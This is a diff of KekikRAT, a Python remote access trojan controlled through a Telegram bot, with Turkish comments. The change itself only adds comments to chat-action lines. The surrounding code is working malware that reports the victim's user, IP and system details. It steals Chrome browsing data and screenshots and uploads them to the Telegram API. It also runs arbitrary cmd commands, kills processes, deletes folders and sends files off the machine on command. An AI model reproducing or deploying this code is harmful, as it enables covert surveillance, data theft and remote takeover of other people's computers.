@@ -39,7 +39,7 @@ Sistem = platform.system()      # İşletim Sistemi Bilgisi
 Bellenim = platform.release()   # Bellenim Sürümü Bilgisi
 islemci = platform.processor()  # İşlemci Özellikleri
 
-KekikRAT.send_chat_action(Chat_ID, 'typing')
+KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
 KekikRAT.send_message(Chat_ID,
                    "⚠️ Bağlantı Geldi ⚠️\n\n" +
                    KullaniciAdi + '@' + BilgisayarAdi +
@@ -50,7 +50,7 @@ KekikRAT.send_message(Chat_ID,
 # / Basla Komutu ########################################################################
 @KekikRAT.message_handler(commands=['basla', 'Basla']) # Basla Komutunu bekliyorum
 def baslangic(command): # Komut yürütülürse
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID,
                           "☣ KekikRAT Çalışıyor ☣" +
                           "\n\nKomutları Öğrenmek için: /komutlar yazabilirsin.." +
@@ -60,7 +60,7 @@ def baslangic(command): # Komut yürütülürse
 # / Komutlar Komutu #######################################################################
 @KekikRAT.message_handler(commands=['komutlar', 'Komutlar']) # Komutlar Komutunu bekliyorum
 def komutlar(command):
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID,
                        "KekikRAT içinde Kullanabileceğiniz Komutlar\n\n"+
                        "/basla - Açılış, Bilgi Alma\n"+
@@ -91,7 +91,7 @@ def sistem(command):
     Bellenim = platform.release()   # Bellenim Sürümü Bilgisi
     islemci = platform.processor()  # İşlemci Özellikleri
 
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID,
                        "Kullanıcı : " + KullaniciAdi + '@' + BilgisayarAdi +
                        "\n\nIP : " + IP +
@@ -109,7 +109,7 @@ def url_ac(message):
     Chrome_Dizini = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
 
     webbrowser.get(Chrome_Dizini).open(URL)         # Bağlantıyı aç / veya / open_new_tab(URL)
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "Hallettim!")    # Mesaj gönder
 # / Url_Ac Komutu ################################################################################
 
@@ -119,19 +119,19 @@ def islem_sonlandir(message):
     try: # Çalıştırmayı Dene (Hata ile karşılaşıldığında betik kapanmasın diye..)
         GelenMesaj = "{0}".format(message.text)                         # Gelen Mesajı içeren değişken
         subprocess.call("taskkill /IM " + GelenMesaj.split(" ")[1])     # Süreci adıyla öldür
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Hallettim!")                    # Mesaj gönder
     except: # Hata varsa
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Kapatılamadı!")
 # / Islem_Sonlandir Komutu ######################################################################################
 
 # / Chrome_Verileri Komutu ######################################################################################
 @KekikRAT.message_handler(commands=["chrome_verileri", "Chrome_Verileri"]) # chrome_verileri Komutunu bekliyorum
 def chrome_verileri(message):
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "Bekleyin...")  # "Bekleyin..." mesajını gönderiyoruz
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     ###
     KullaniciAdi = os.getlogin()
     ChromeYolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
@@ -286,26 +286,26 @@ def chrome_verileri(message):
         os.remove(AppData + '{}_History.sql'.format(KullaniciAdi))
     imha()
     def TelegramSend():
-        KekikRAT.send_chat_action(Chat_ID, 'upload_document')
+        KekikRAT.send_chat_action(Chat_ID, 'upload_document')  # Dosya Gönderiyor Aksiyonu
         Loglar = {'document': open(AppData + '{}_LOG.zip'.format(KullaniciAdi), 'rb')}
         requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendDocument?chat_id=" + Chat_ID, files=Loglar)
     TelegramSend()
     os.remove(AppData + '{}_LOG.zip'.format(KullaniciAdi))
     ###
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "Hallettim!")
 # / Chrome_Verileri Komutu ######################################################################################
 
 # / Ekran_Goruntusu Komutu ##################################################################################################################
 @KekikRAT.message_handler(commands=['ekran_goruntusu', 'Ekran_Goruntusu']) # ekran_goruntusu Komutunu bekliyorum
 def ekran_goruntusu(command) :
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "Bekleyin...")                   # "Bekleyin..." mesajını gönderiyoruz
     Ekran = ImageGrab.grab()                                        # Ekran görüntüsü almaya eşit bir değişken oluşturduk
     Ekran.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')            # Ekran görüntüsünü AppData klasörüne kaydettik
     Ekran = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')    # Değişkenimizi güncelliyoruz
     EkranResmi = {'photo': Ekran}                                   # POST isteği göndermek için değişken oluşturduk
-    KekikRAT.send_chat_action(Chat_ID, 'upload_photo')
+    KekikRAT.send_chat_action(Chat_ID, 'upload_photo') # Fotoğraf Gönderiyor Aksiyonu
     requests.post("https://api.telegram.org/bot" + Bot_Token + "/sendPhoto?chat_id=" + Chat_ID , files=EkranResmi) # Bir istekte bulunuyoruz
 # / Ekran_Goruntusu Komutu ##################################################################################################################
 
@@ -313,7 +313,7 @@ def ekran_goruntusu(command) :
 @KekikRAT.message_handler(commands=['pwd' , 'PWD']) # pwd Komutunu Bekliyorum
 def pwd(command) :
     Bulunulan_Dizin = os.path.abspath(os.getcwd()) # Geçerli Dizini tanımladık
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "Geçerli dizin: \n" + (str(Bulunulan_Dizin)))  # Mesaj gönder
 # / PWD Komutu ##################################################################################
 
@@ -321,7 +321,7 @@ def pwd(command) :
 @KekikRAT.message_handler(commands=["ls", "LS"]) # ls Komutunu bekliyorum
 def ls_dir(commands):
      Listele = '\n'.join(os.listdir(path=".")) # Tüm klasörleri ve dosyaları içeren Listele değişkeni tanımladık
-     KekikRAT.send_chat_action(Chat_ID, 'typing')
+     KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
      KekikRAT.send_message(Chat_ID, "{} :".format(os.getcwd()) + "\n\n" + Listele)
 # / LS Komutu ###################################################################################################
 
@@ -332,10 +332,10 @@ def cd_dir(message):
         GelenMesaj = "{0}".format(message.text)
         GidilecekDizin = GelenMesaj.split(" ")[1] # Değişken - dizin
         os.chdir(GidilecekDizin) # Dizini değiştir
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Şu şekilde değişti:\n\n{}".format(os.getcwd()))
     except: # Hata varsa
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Dizine Gidilemedi!")
 # / CD Komutu #############################################################################
 
@@ -346,10 +346,10 @@ def delete_dir(message) :
         GelenMesaj = "{0}".format(message.text)
         SilinecekDizin = GelenMesaj.split(" ")[1] # Değişken - Klasör adı
         os.removedirs(SilinecekDizin) # Klasörü sil
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Bu Klasör: " + SilinecekDizin + " silindi..")
     except: # Hata varsa
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Dizin Silinemedi!")
 # / RM_Dir Komutu ######################################################################
 
@@ -357,7 +357,7 @@ def delete_dir(message) :
 @KekikRAT.message_handler(commands=["indir", "Indir"])  # indir Komutunu bekliyorum
 def dosya_indir(message):
     try: # Çalıştırmayı Dene
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Bekleyin...")  
     
         GelenMesaj = "{0}".format(message.text)
@@ -365,11 +365,11 @@ def dosya_indir(message):
 
         Gonderi = {'document': open(Dosya, 'rb')}  # POST isteği için değişken
         
-        KekikRAT.send_chat_action(Chat_ID, 'upload_document')
+        KekikRAT.send_chat_action(Chat_ID, 'upload_document')  # Dosya Gönderiyor Aksiyonu
         requests.post("https://api.telegram.org/bot" + Bot_Token +
                       "/sendDocument?chat_id=" + Chat_ID , files=Gonderi)  # Dosya gönder
     except: # Hata varsa
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Dosya İndirilemedi! (Dizin İndirilmez!)")
 # / Indir Komutu ########################################################################
 
@@ -379,17 +379,17 @@ def cmd_komutu(message) :
     try: # Çalıştırmayı Dene
         GelenMesaj = "{0}".format(message.text)
         subprocess.Popen([r'C:\\Windows\\system32\\cmd.exe', GelenMesaj.split(" ")[1]])  # Cmd'de çalıştır
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "Bitti!")
     except: # Hata varsa
-        KekikRAT.send_chat_action(Chat_ID, 'typing')
+        KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
         KekikRAT.send_message(Chat_ID, "CMD Komutu Çalıştırılamadı!")
 # / CMD Komutu ###########################################################################################
 
 # / HAKKINDA Komutu ################################################################################################
 @KekikRAT.message_handler(commands = ["hakkinda", "HAKKINDA"]) # hakkinda Komutunu bekliyorum
 def hakkinda(commands):
-    KekikRAT.send_chat_action(Chat_ID, 'typing')
+    KekikRAT.send_chat_action(Chat_ID, 'typing') # Yazıyor Aksiyonu
     KekikRAT.send_message(Chat_ID, "☣ KekikRAT v 1.0 ☣ \n\nCoded by @keyiflerolsun \nSpecial for @KekikAkademi ♥")
 # / HAKKINDA Komutu ################################################################################################
 
